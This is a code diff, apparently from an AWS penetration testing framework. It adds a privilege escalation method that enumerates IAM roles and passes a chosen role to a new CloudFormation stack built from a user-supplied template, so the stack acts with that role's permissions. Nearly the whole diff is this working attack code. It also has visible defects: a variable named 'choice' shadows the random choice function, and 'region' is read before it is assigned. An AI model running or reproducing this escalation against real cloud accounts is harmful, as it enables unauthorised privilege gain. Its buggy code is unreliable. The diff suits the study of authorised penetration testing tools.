@@ -1712,8 +1712,85 @@ def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
     return True
 
 
-def PassExistingRoleToCloudFormation(pacu_main, print, input, fetch_data):
-    return
+def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
+
+    print('  Starting method PassExistingRoleToNewCloudFormation...\n')
+
+    target_role_arn = input('    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+
+    if not target_role_arn:
+        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return False
+        roles = deepcopy(session.IAM['Roles'])
+
+        print('Found {} roles. Choose one below.'.format(len(roles)))
+        for i in range(0, len(roles)):
+            print('  [{}] {}'.format(i, roles[i]['RoleName']))
+        choice = input('Choose an option: ')
+        target_role_arn = roles[int(choice)]['Arn']
+
+    regions = pacu_main.get_regions('cloudformation')
+    if len(regions) > 1:
+        print('  Found multiple valid regions to use. Choose one below.\n')
+        for i in range(0, len(regions)):
+            print('  [{}] {}'.format(i, regions[i]))
+        choice = input('What region do you want to create the CloudFormation stack in? ')
+        region = regions[int(choice)]
+    elif len(regions) == 1:
+        region = regions[0]
+    else:
+        while not region:
+            all_cloudformation_regions = pacu_main.get_regions('cloudformation', check_session=False)
+            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
+            if not region:
+                return False
+            elif region not in all_cloudformation_regions:
+                print('    Region {} is not a valid CloudFormation region. Please choose a valid region. Valid CloudFormation regions include:\n'.format(region))
+                print(all_cloudformation_regions)
+                region = None
+
+    client = pacu_main.get_boto3_client('cloudformation', region)
+    stack_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+
+    template = None
+    while not template:
+        template = input('You need to supply a CloudFormation template. This can be either a URL or a local file. Enter what type of path you are entering and then the path (example: "file /home/me/cf.template" or "url https://mysite.com/mytemplate.template") or just press enter to skip this privilege escalation method: ')
+        if not template:
+            print('Skipping to next privilege escalation method...\n')
+            return False
+
+        template = template.split(' ', 1)
+        if len(template) == 2 and (template[0].lower() == 'file' or template[0].lower() == 'url'):
+            break
+        else:
+            template = None
+            print('  Received invalid input. Enter in what kind of path you are using ("file" or "url"), then a space, then the path. Example: "file /home/me/my.template". Try again!')
+    try:
+        # TODO: Add in IAM resource acknowledgement. Test if I
+        # can just specify a certain value no matter what and
+        # expect it to work https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-iam-template.html#capabilities
+        if template[0] == 'url':
+            response = client.create_stack(
+                StackName=stack_name,
+                RoleARN=target_role_arn,
+                TemplateURL=template[1]
+            )
+        elif template[0] == 'file':
+            with open(template[1], 'r') as f:
+                template_contents = f.read()
+            response = client.create_stack(
+                StackName=stack_name,
+                RoleARN=target_role_arn,
+                TemplateBody=template_contents
+            )
+        # TODO: Give some steps on what is next here to utilize these permissions
+        print('Successfully started creation the CloudFormation stack {}! Here is the stack ID: {}\n'.format(stack_name, response['StackId']))
+        return True
+    except Exception as error:
+        print('Failed to create the CloudFormation stack: {}\n'.format(error))
+        return False
 
 
 def PassExistingRoleToNewDataPipeline(pacu_main, print, input, fetch_data):
